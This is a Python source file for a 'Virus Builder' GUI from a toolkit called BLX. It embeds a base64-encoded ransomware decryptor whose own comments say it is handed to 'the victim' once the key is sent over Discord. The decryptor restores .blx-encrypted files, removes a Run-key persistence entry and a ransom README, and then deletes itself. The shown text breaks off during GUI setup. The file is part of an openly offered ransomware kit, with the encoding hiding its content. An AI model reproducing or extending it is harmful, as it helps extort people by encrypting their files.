# Copyright (c) BLX
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import customtkinter as ctk
    import tkinter
    import os
    import json
    import shutil
    import random
    import string
    import ast
    import base64
    from tkinter import filedialog
    from tkinter import messagebox
    import webbrowser
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
except Exception as e:
    ErrorModule(e)

import tempfile

# Source du déchiffreur .blx (intégré, pas de fichier externe BLX_Decryptor.py)
def _get_blx_decryptor_source():
    return (base64.b64decode(
        "IyBDb3B5cmlnaHQgKGMpIEJMWCAtIERlY3J5cHRvciBmb3IgLmJseCBlbmNyeXB0ZWQgZmlsZXMKIyBHaXZlIHRoaXMgRVhFIChvciBzY3JpcHQpIHRvIHRoZSB2aWN0aW0gd2l0aCB0aGUgZGVjcnlwdGlvbiBrZXkuCiMgS2V5IGZvcm1hdDogYmFzZTY0IHN0cmluZyAoMzIgYnl0ZXMgZGVjb2RlZCkgLSBzYW1lIGFzIHNlbnQgdmlhICFrZXkgaW4gRGlzY29yZC4KIyBCdWlsZCB0byBFWEU6IHJ1biBidWlsZF9kZWNyeXB0b3JfZXhlLmJhdCBvcjogcHlpbnN0YWxsZXIgLS1vbmVmaWxlIC0td2luZG93ZWQgLS1uYW1lIEJMWF9EZWNyeXB0b3IgQkxYX0RlY3J5cHRvci5weQoKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IGJhc2U2NAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0ZW1wZmlsZQoKdHJ5OgogICAgaW1wb3J0IHRraW50ZXIgYXMgdGsKICAgIGZyb20gdGtpbnRlciBpbXBvcnQgdHRrLCBmaWxlZGlhbG9nLCBtZXNzYWdlYm94LCBzY3JvbGxlZHRleHQKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoInRraW50ZXIgcmVxdWlyZWQuIFJ1biB3aXRoIFB5dGhvbiBhbmQgR1VJIHN1cHBvcnQuIikKICAgIHN5cy5leGl0KDEpCgp0cnk6CiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzIGltcG9ydCBDaXBoZXIsIGFsZ29yaXRobXMsIG1vZGVzCiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgcGFkZGluZwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmQKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoIkluc3RhbGw6IHBpcCBpbnN0YWxsIGNyeXB0b2dyYXBoeSIpCiAgICBzeXMuZXhpdCgxKQoKU0NSSVBUX0RJUiA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQpERUZBVUxUX0ZPTERFUiA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpIGlmIG9zLnBhdGguZXhwYW5kdXNlcigifiIpIGVsc2Ugb3MucGF0aC5qb2luKCJDOiIsICJVc2VycyIsIG9zLmdldGVudigiVVNFUk5BTUUiLCAiIikpCkJMWF9FWFQgPSAiLmJseCIKQ1JFQVRFX05PX1dJTkRPVyA9IGdldGF0dHIoc3VicHJvY2VzcywgIkNSRUFURV9OT19XSU5ET1ciLCAweDA4MDAwMDAwKQoKCmRlZiBfZ2V0X2Rlc2t0b3BfcGF0aHMoKToKICAgICIiIlJldHVybiBsaXN0IG9mIHBvc3NpYmxlIGRlc2t0b3AgZm9sZGVyIHBhdGhzICh1c2VyLCBPbmVEcml2ZSwgQnVyZWF1LCBQdWJsaWMpLiIiIgogICAgdSA9IG9zLmdldGVudigiVVNFUlBST0ZJTEUiLCAiIikKICAgIHAgPSBvcy5nZXRlbnYoIlBVQkxJQyIsICIiKQogICAgY2FuZGlkYXRlcyA9IFsKICAgICAgICBvcy5wYXRoLmpvaW4odSwgIkRlc2t0b3AiKSwKICAgICAgICBvcy5wYXRoLmpvaW4odSwgIk9uZURyaXZlIiwgIkRlc2t0b3AiKSwKICAgICAgICBvcy5wYXRoLmpvaW4odSwgIk9uZURyaXZlIiwgIkJ1cmVhdSIpLAogICAgICAgIG9zLnBhdGguam9pbih1LCAiQnVyZWF1IiksCiAgICAgICAgb3MucGF0aC5qb2luKHAsICJEZXNrdG9wIiksCiAgICBdCiAgICByZXR1cm4gW3ggZm9yIHggaW4gY2FuZGlkYXRlcyBpZiB4IGFuZCBvcy5wYXRoLmlzZGlyKHgpXQoKCmRlZiByZW1vdmVfYWxsX3RyYWNlc19hbmRfc2VsZl9kZWxldGUoKToKICAgICIiIlJlbW92ZSByYW5zb213YXJlIHRyYWNlcyAocGVyc2lzdGVuY2UsIFJFQURNRSkgYW5kIHNjaGVkdWxlIHNlbGYtZGVsZXRpb24gb2YgdGhlIGRlY3J5cHRvci4iIiIKICAgIHRyeToKICAgICAgICBpZiBzeXMucGxhdGZvcm0uc3RhcnRzd2l0aCgid2luIik6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICAgICAgICAgIFsicmVnIiwgImRlbGV0ZSIsICJIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIiwgIi92IiwgIkJMWF9VcGRhdGUiLCAiL2YiXSwKICAgICAgICAgICAgICAgICAgICBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csCiAgICAgICAgICAgICAgICAgICAgdGltZW91dD01LAogICAgICAgICAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIGZvciBkZXNrdG9wIGluIF9nZXRfZGVza3RvcF9wYXRocygpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHJlYWRtZSA9IG9zLnBhdGguam9pbihkZXNrdG9wLCAiUkVBRE1FX0JMWC50eHQiKQogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHJlYWRtZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShyZWFkbWUpCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICBtZSA9IHN5cy5leGVjdXRhYmxlIGlmIGdldGF0dHIoc3lzLCAiZnJvemVuIiwgRmFsc2UpIGVsc2Ugb3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKQogICAgICAgIGlmIG5vdCBtZSBvciBub3Qgb3MucGF0aC5pc2ZpbGUobWUpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICB0bXAgPSB0ZW1wZmlsZS5nZXR0ZW1wZGlyKCkKICAgICAgICBiYXQgPSBvcy5wYXRoLmpvaW4odG1wLCAiQkxYX2NsZWFudXBfJXMuYmF0IiAlIG9zLmdldHBpZCgpKQogICAgICAgIG1lX3F1b3RlZCA9ICciJXMiJyAlIG1lLnJlcGxhY2UoJyInLCAnIiInKQogICAgICAgIGNvbnRlbnQgPSAiQGVjaG8gb2ZmXHJcbnRpbWVvdXQgL3QgMyAvbm9icmVhayA+bnVsXHJcbmRlbCAvZiAvcSAlc1xyXG5kZWwgL2YgL3EgXCIlJX5mMFwiXHJcbiIgJSBtZV9xdW90ZWQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggb3BlbihiYXQsICJ3IikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoY29udGVudCkKICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbigKICAgICAgICAgICAgICAgIFsiY21kIiwgIi9jIiwgYmF0XSwKICAgICAgICAgICAgICAgIGNyZWF0aW9uZmxhZ3M9Q1JFQVRFX05PX1dJTkRPVywKICAgICAgICAgICAgICAgIGN3ZD10bXAsCiAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLkRFVk5VTEwsCiAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLAogICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCwKICAgICAgICAgICAgKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwoKCmRlZiBkZWNyeXB0X2ZpbGUoa2V5X2J5dGVzLCBwYXRoX2JseCwgbG9nX2NhbGxiYWNrPU5vbmUpOgogICAgIiIiRGVjcnlwdCBhIHNpbmdsZSAuYmx4IGZpbGUuIGtleV9ieXRlcyBtdXN0IGJlIDMyIGJ5dGVzLiBGb3JtYXQ6IFsxNiBieXRlcyBJVl1bQUVTLTI1Ni1DQkMgZW5jcnlwdGVkIFBLQ1M3LXBhZGRlZCBkYXRhXS4iIiIKICAgIGlmIGxlbihrZXlfYnl0ZXMpICE9IDMyOgogICAgICAgIHJldHVybiBGYWxzZSwgIktleSBtdXN0IGJlIDMyIGJ5dGVzIChkZWNvZGUgYmFzZTY0KSIKICAgIGlmIG5vdCBwYXRoX2JseCBvciBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aF9ibHgpOgogICAgICAgIHJldHVybiBGYWxzZSwgIk5vdCBhIGZpbGUgb3Igbm90IGZvdW5kIgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihwYXRoX2JseCwgInJiIikgYXMgZjoKICAgICAgICAgICAgcmF3ID0gZi5yZWFkKCkKICAgICAgICBpZiBsZW4ocmF3KSA8IDE3OgogICAgICAgICAgICByZXR1cm4gRmFsc2UsICJGaWxlIHRvbyBzbWFsbCAoY29ycnVwdGVkIG9yIG5vdCAuYmx4KSIKICAgICAgICBpdiA9IHJhd1s6MTZdCiAgICAgICAgZW5jcnlwdGVkID0gcmF3WzE2Ol0KICAgICAgICBjaXBoZXIgPSBDaXBoZXIoYWxnb3JpdGhtcy5BRVMoa2V5X2J5dGVzKSwgbW9kZXMuQ0JDKGl2KSwgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKSkKICAgICAgICBkZWNyeXB0b3IgPSBjaXBoZXIuZGVjcnlwdG9yKCkKICAgICAgICBkZWNyeXB0ZWQgPSBkZWNyeXB0b3IudXBkYXRlKGVuY3J5cHRlZCkgKyBkZWNyeXB0b3IuZmluYWxpemUoKQogICAgICAgIHVucGFkZGVyID0gcGFkZGluZy5QS0NTNygxMjgpLnVucGFkZGVyKCkKICAgICAgICBkYXRhID0gdW5wYWRkZXIudXBkYXRlKGRlY3J5cHRlZCkgKyB1bnBhZGRlci5maW5hbGl6ZSgpCiAgICAgICAgcGF0aF9sb3dlciA9IHBhdGhfYmx4Lmxvd2VyKCkKICAgICAgICBpZiBwYXRoX2xvd2VyLmVuZHN3aXRoKEJMWF9FWFQpOgogICAgICAgICAgICBvdXRfcGF0aCA9IHBhdGhfYmx4WzogLWxlbihCTFhfRVhUKV0KICAgICAgICBlbHNlOgogICAgICAgICAgICBvdXRfcGF0aCA9IHBhdGhfYmx4ICsgIi5kZWMiCiAgICAgICAgb3V0X2RpciA9IG9zLnBhdGguZGlybmFtZShvdXRfcGF0aCkKICAgICAgICBpZiBvdXRfZGlyIGFuZCBub3Qgb3MucGF0aC5pc2RpcihvdXRfZGlyKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgb3MubWFrZWRpcnMob3V0X2RpciwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZSwgIkNhbm5vdCBjcmVhdGUgb3V0cHV0IGRpcmVjdG9yeSIKICAgICAgICB3aXRoIG9wZW4ob3V0X3BhdGgsICJ3YiIpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZGF0YSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoX2JseCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCiAgICAgICAgcmV0dXJuIFRydWUsIG91dF9wYXRoCiAgICBleGNlcHQgVmFsdWVFcnJvciBhcyBlOgogICAgICAgIHJldHVybiBGYWxzZSwgIkNsw6kgaW5jb3JyZWN0ZSBvdSBmaWNoaWVyIGNvcnJvbXB1IChwYWRkaW5nIGludmFsaWRlKSIKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gRmFsc2UsIHN0cihlKQoKCmRlZiBkZWNyeXB0X2ZvbGRlcihrZXlfYjY0LCBmb2xkZXIsIGxvZ19jYWxsYmFjaz1Ob25lKToKICAgICIiIkZpbmQgYWxsIC5ibHggZmlsZXMgaW4gZm9sZGVyIChyZWN1cnNpdmUpIGFuZCBkZWNyeXB0IHRoZW0uIiIiCiAgICBrZXlfYjY0ID0gKGtleV9iNjQgb3IgIiIpLnN0cmlwKCkKICAgIGtleV9iNjQgPSAiIi5qb2luKGtleV9iNjQuc3BsaXQoKSkKICAgIGlmIG5vdCBrZXlfYjY0OgogICAgICAgIHJldHVybiAwLCAwLCAiRW50ZXIgdGhlIGRlY3J5cHRpb24ga2V5IChiYXNlNjQpLiIKICAgIHRyeToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtleV9ieXRlcyA9IGJhc2U2NC5iNjRkZWNvZGUoa2V5X2I2NCwgdmFsaWRhdGU9VHJ1ZSkKICAgICAgICBleGNlcHQgVHlwZUVycm9yOgogICAgICAgICAgICBrZXlfYnl0ZXMgPSBiYXNlNjQuYjY0ZGVjb2RlKGtleV9iNjQpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIDAsIDAsIGYiSW52YWxpZCBiYXNlNjQga2V5OiB7ZX0iCiAgICBpZiBsZW4oa2V5X2J5dGVzKSAhPSAzMjoKICAgICAgICByZXR1cm4gMCwgMCwgZiJLZXkgbXVzdCBkZWNvZGUgdG8gMzIgYnl0ZXMgKGdvdCB7bGVuKGtleV9ieXRlcyl9KS4iCiAgICBmb2xkZXIgPSAoZm9sZGVyIG9yICIiKS5zdHJpcCgpIG9yIERFRkFVTFRfRk9MREVSCiAgICBpZiBub3Qgb3MucGF0aC5pc2Rpcihmb2xkZXIpOgogICAgICAgIHJldHVybiAwLCAwLCBmIkZvbGRlciBub3QgZm91bmQ6IHtmb2xkZXJ9IgogICAgb2ssIGZhaWwgPSAwLCAwCiAgICBlcnJvcnMgPSBbXQogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZm9sZGVyLCB0b3Bkb3duPVRydWUpOgogICAgICAgIGZvciBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICBpZiBub3QgbmFtZS5sb3dlcigpLmVuZHN3aXRoKEJMWF9FWFQpOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgcGF0aF9ibHggPSBvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSkKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhfYmx4KToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHN1Y2Nlc3MsIG1zZyA9IGRlY3J5cHRfZmlsZShrZXlfYnl0ZXMsIHBhdGhfYmx4LCBsb2dfY2FsbGJhY2spCiAgICAgICAgICAgICAgICBpZiBzdWNjZXNzOgogICAgICAgICAgICAgICAgICAgIG9rICs9IDEKICAgICAgICAgICAgICAgICAgICBpZiBsb2dfY2FsbGJhY2s6CiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ19jYWxsYmFjayhmIk9LOiB7cGF0aF9ibHh9XG4gIC0+IHttc2d9IikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgZmFpbCArPSAxCiAgICAgICAgICAgICAgICAgICAgaWYgbG9nX2NhbGxiYWNrOgogICAgICAgICAgICAgICAgICAgICAgICBsb2dfY2FsbGJhY2soZiJGQUlMOiB7cGF0aF9ibHh9IC0ge21zZ30iKQogICAgICAgICAgICAgICAgICAgIGVycm9ycy5hcHBlbmQoZiJ7cGF0aF9ibHh9OiB7bXNnfSIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGZhaWwgKz0gMQogICAgICAgICAgICAgICAgZXJyb3JzLmFwcGVuZChmIntwYXRoX2JseH06IHtlfSIpCiAgICAgICAgICAgICAgICBpZiBsb2dfY2FsbGJhY2s6CiAgICAgICAgICAgICAgICAgICAgbG9nX2NhbGxiYWNrKGYiRVJST1I6IHtwYXRoX2JseH0gLSB7ZX0iKQogICAgc3VtbWFyeSA9IGYiRGVjcnlwdGVkOiB7b2t9IHwgRmFpbGVkOiB7ZmFpbH0iCiAgICBpZiBlcnJvcnM6CiAgICAgICAgc3VtbWFyeSArPSAiXG4iICsgIlxuIi5qb2luKGVycm9yc1s6MTBdKQogICAgICAgIGlmIGxlbihlcnJvcnMpID4gMTA6CiAgICAgICAgICAgIHN1bW1hcnkgKz0gZiJcbi4uLiBhbmQge2xlbihlcnJvcnMpIC0gMTB9IG1vcmUgZXJyb3JzIgogICAgcmV0dXJuIG9rLCBmYWlsLCBzdW1tYXJ5CgoKY2xhc3MgRGVjcnlwdG9yQXBwOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYucm9vdCA9IHRrLlRrKCkKICAgICAgICBzZWxmLnJvb3QudGl0bGUoIkJMWCBEZWNyeXB0b3IgLSBSZXN0b3JlIC5ibHggZmlsZXMiKQogICAgICAgIHNlbGYucm9vdC5nZW9tZXRyeSgiNjIweDQ4MCIpCiAgICAgICAgc2VsZi5yb290LnJlc2l6YWJsZShUcnVlLCBUcnVlKQogICAgICAgIHNlbGYucm9vdC5jb25maWd1cmUoYmc9IiMyNjI2MjYiKQogICAgICAgIHNlbGYucm9vdC5vcHRpb25fYWRkKCIqRm9udCIsICJTZWdvZSBVSSAxMCIpCiAgICAgICAgc2VsZi5mb2xkZXJfdmFyID0gdGsuU3RyaW5nVmFyKHZhbHVlPURFRkFVTFRfRk9MREVSKQogICAgICAgIHNlbGYua2V5X3ZhciA9IHRrLlN0cmluZ1ZhcigpCiAgICAgICAgc2VsZi5ydW5uaW5nID0gRmFsc2UKICAgICAgICBzZWxmLl9idWlsZF91aSgpCgogICAgZGVmIF9idWlsZF91aShzZWxmKToKICAgICAgICBtYWluID0gdHRrLkZyYW1lKHNlbGYucm9vdCwgcGFkZGluZz0xMikKICAgICAgICBtYWluLnBhY2soZmlsbD10ay5CT1RILCBleHBhbmQ9VHJ1ZSkKICAgICAgICB0dGsuTGFiZWwobWFpbiwgdGV4dD0iRGVjcnlwdGlvbiBrZXkgKGJhc2U2NCkg4oCUIHBhc3RlIHRoZSBrZXkgeW91IHJlY2VpdmVkOiIpLnBhY2soYW5jaG9yPXRrLlcpCiAgICAgICAgc2VsZi5rZXlfZW50cnkgPSB0ay5FbnRyeShtYWluLCB0ZXh0dmFyaWFibGU9c2VsZi5rZXlfdmFyLCB3aWR0aD03MCwgc2hvdz0iIiwgZm9udD0oIkNvbnNvbGFzIiwgMTApKQogICAgICAgIHNlbGYua2V5X2VudHJ5LnBhY2soZmlsbD10ay5YLCBwYWR5PSgwLCA4KSkKICAgICAgICB0dGsuTGFiZWwobWFpbiwgdGV4dD0iRm9sZGVyIHRvIGRlY3J5cHQgKGRlZmF1bHQ6IHlvdXIgdXNlciBmb2xkZXIpOiIpLnBhY2soYW5jaG9yPXRrLlcsIHBhZHk9KDgsIDApKQogICAgICAgIHJvdyA9IHR0ay5GcmFtZShtYWluKQogICAgICAgIHJvdy5wYWNrKGZpbGw9dGsuWCwgcGFkeT00KQogICAgICAgIHNlbGYuZm9sZGVyX2VudHJ5ID0gdGsuRW50cnkocm93LCB0ZXh0dmFyaWFibGU9c2VsZi5mb2xkZXJfdmFyLCB3aWR0aD01NSwgZm9udD0oIkNvbnNvbGFzIiwgOSkpCiAgICAgICAgc2VsZi5mb2xkZXJfZW50cnkucGFjayhzaWRlPXRrLkxFRlQsIGZpbGw9dGsuWCwgZXhwYW5kPVRydWUsIHBhZHg9KDAsIDgpKQogICAgICAgIHR0ay5CdXR0b24ocm93LCB0ZXh0PSJCcm93c2UuLi4iLCBjb21tYW5kPXNlbGYuX2Jyb3dzZSkucGFjayhzaWRlPXRrLlJJR0hUKQogICAgICAgIHNlbGYuZGVjcnlwdF9idG4gPSB0dGsuQnV0dG9uKG1haW4sIHRleHQ9IkRlY3J5cHQgLmJseCBmaWxlcyIsIGNvbW1hbmQ9c2VsZi5fc3RhcnRfZGVjcnlwdCkKICAgICAgICBzZWxmLmRlY3J5cHRfYnRuLnBhY2socGFkeT0xMikKICAgICAgICB0dGsuTGFiZWwobWFpbiwgdGV4dD0iTG9nOiIpLnBhY2soYW5jaG9yPXRrLlcsIHBhZHk9KDgsIDApKQogICAgICAgIHNlbGYubG9nX3RleHQgPSBzY3JvbGxlZHRleHQuU2Nyb2xsZWRUZXh0KG1haW4sIGhlaWdodD0xNCwgd2lkdGg9NzIsIGZvbnQ9KCJDb25zb2xhcyIsIDkpLCBzdGF0ZT10ay5ESVNBQkxFRCkKICAgICAgICBzZWxmLmxvZ190ZXh0LnBhY2soZmlsbD10ay5CT1RILCBleHBhbmQ9VHJ1ZSwgcGFkeT00KQoKICAgIGRlZiBfYnJvd3NlKHNlbGYpOgogICAgICAgIGluaXRpYWwgPSAoc2VsZi5mb2xkZXJfdmFyLmdldCgpIG9yICIiKS5zdHJpcCgpIG9yIERFRkFVTFRfRk9MREVSCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIoaW5pdGlhbCk6CiAgICAgICAgICAgIGluaXRpYWwgPSBERUZBVUxUX0ZPTERFUgogICAgICAgIGQgPSBmaWxlZGlhbG9nLmFza2RpcmVjdG9yeSh0aXRsZT0iU2VsZWN0IGZvbGRlciB0byBkZWNyeXB0IiwgaW5pdGlhbGRpcj1pbml0aWFsKQogICAgICAgIGlmIGQ6CiAgICAgICAgICAgIHNlbGYuZm9sZGVyX3Zhci5zZXQoZCkKCiAgICBkZWYgX2xvZyhzZWxmLCBtc2cpOgogICAgICAgIGRlZiBfZG8oKToKICAgICAgICAgICAgc2VsZi5sb2dfdGV4dC5jb25maWd1cmUoc3RhdGU9dGsuTk9STUFMKQogICAgICAgICAgICBzZWxmLmxvZ190ZXh0Lmluc2VydCh0ay5FTkQsIG1zZyArICJcbiIpCiAgICAgICAgICAgIHNlbGYubG9nX3RleHQuc2VlKHRrLkVORCkKICAgICAgICAgICAgc2VsZi5sb2dfdGV4dC5jb25maWd1cmUoc3RhdGU9dGsuRElTQUJMRUQpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLnJvb3QuYWZ0ZXIoMCwgX2RvKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgX3N0YXJ0X2RlY3J5cHQoc2VsZik6CiAgICAgICAgaWYgc2VsZi5ydW5uaW5nOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBzZWxmLnJ1bm5pbmcgPSBUcnVlCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLmRlY3J5cHRfYnRuLmNvbmZpZ3VyZShzdGF0ZT10ay5ESVNBQkxFRCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCiAgICAgICAgc2VsZi5sb2dfdGV4dC5jb25maWd1cmUoc3RhdGU9dGsuTk9STUFMKQogICAgICAgIHNlbGYubG9nX3RleHQuZGVsZXRlKDEuMCwgdGsuRU5EKQogICAgICAgIHNlbGYubG9nX3RleHQuY29uZmlndXJlKHN0YXRlPXRrLkRJU0FCTEVEKQogICAgICAgIGtleSA9IHNlbGYua2V5X3Zhci5nZXQoKQogICAgICAgIGZvbGRlciA9IChzZWxmLmZvbGRlcl92YXIuZ2V0KCkgb3IgIiIpLnN0cmlwKCkgb3IgREVGQVVMVF9GT0xERVIKCiAgICAgICAgZGVmIHJ1bigpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvaywgZmFpbCwgc3VtbWFyeSA9IGRlY3J5cHRfZm9sZGVyKGtleSwgZm9sZGVyLCBsb2dfY2FsbGJhY2s9c2VsZi5fbG9nKQogICAgICAgICAgICAgICAgc2VsZi5yb290LmFmdGVyKDAsIGxhbWJkYTogc2VsZi5fZG9uZShvaywgZmFpbCwgc3VtbWFyeSkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHNlbGYucm9vdC5hZnRlcigwLCBsYW1iZGE6IHNlbGYuX2RvbmUoMCwgMCwgc3RyKGUpKSkKICAgICAgICAgICAgZmluYWxseToKICAgICAgICAgICAgICAgIHNlbGYucm9vdC5hZnRlcigwLCBzZWxmLl9kZWNyeXB0X2ZpbmlzaGVkKQoKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1ydW4sIGRhZW1vbj1UcnVlKS5zdGFydCgpCgogICAgZGVmIF9kZWNyeXB0X2ZpbmlzaGVkKHNlbGYpOgogICAgICAgIHNlbGYucnVubmluZyA9IEZhbHNlCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLmRlY3J5cHRfYnRuLmNvbmZpZ3VyZShzdGF0ZT10ay5OT1JNQUwpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBfZG9uZShzZWxmLCBvaywgZmFpbCwgc3VtbWFyeSk6CiAgICAgICAgc2VsZi5fbG9nKHN1bW1hcnkpCiAgICAgICAgbXNnID0gZiJEb25lLlxue3N1bW1hcnl9IgogICAgICAgIGlmIGxlbihtc2cpID4gMjAwMDoKICAgICAgICAgICAgbXNnID0gbXNnWzoxOTk3XSArICIuLi4iCiAgICAgICAgbWVzc2FnZWJveC5zaG93aW5mbygiQkxYIERlY3J5cHRvciIsIG1zZykKICAgICAgICBpZiBvayA+PSAxOgogICAgICAgICAgICBzZWxmLl9sb2coIlJlbW92aW5nIHRyYWNlcyBhbmQgdW5pbnN0YWxsaW5nIGRlY3J5cHRvci4uLiIpCiAgICAgICAgICAgIHJlbW92ZV9hbGxfdHJhY2VzX2FuZF9zZWxmX2RlbGV0ZSgpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYucm9vdC5xdWl0KCkKICAgICAgICAgICAgICAgIHNlbGYucm9vdC5kZXN0cm95KCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgc3lzLmV4aXQoMCkKCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgIHNlbGYucm9vdC5tYWlubG9vcCgpCgoKZGVmIG1haW4oKToKICAgIGlmIGxlbihzeXMuYXJndikgPiAxIGFuZCBzeXMuYXJndlsxXSA9PSAiLS1jbGkiOgogICAgICAgIGtleV9iNjQgPSBpbnB1dCgiUGFzdGUgZGVjcnlwdGlvbiBrZXkgKGJhc2U2NCk6ICIpLnN0cmlwKCkKICAgICAgICBmb2xkZXIgPSBpbnB1dCgiRm9sZGVyIHRvIGRlY3J5cHQgW0VudGVyID0gZGVmYXVsdF06ICIpLnN0cmlwKCkgb3IgREVGQVVMVF9GT0xERVIKICAgICAgICBvaywgZmFpbCwgc3VtbWFyeSA9IGRlY3J5cHRfZm9sZGVyKGtleV9iNjQsIGZvbGRlcikKICAgICAgICBwcmludChzdW1tYXJ5KQogICAgICAgIGlmIG9rID49IDE6CiAgICAgICAgICAgIHByaW50KCJSZW1vdmluZyB0cmFjZXMgYW5kIHVuaW5zdGFsbGluZy4uLiIpCiAgICAgICAgICAgIHJlbW92ZV9hbGxfdHJhY2VzX2FuZF9zZWxmX2RlbGV0ZSgpCiAgICAgICAgc3lzLmV4aXQoMCBpZiBvayA+PSAxIGVsc2UgMSkKICAgIGFwcCA9IERlY3J5cHRvckFwcCgpCiAgICBhcHAucnVuKCkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg=="
    ).decode("utf-8"))

Title("Virus Builder")

try:
    exit_window = False

    colors = {
        "white"     : "#ffffff",
        "red"       : "#a80505",
        "dark_red"  : "#800000",
        "dark_gray" : "#1e1e1e",
        "gray"      : "#444444",
        "light_gray": "#949494",
        "background": "#262626"
    }

    def _cancel_all_after():
        try:
            after_ids = builder.tk.eval('after info').split()
            for aid in after_ids:
                try:
                    builder.after_cancel(aid)
                except Exception:
                    pass
        except Exception:
            pass

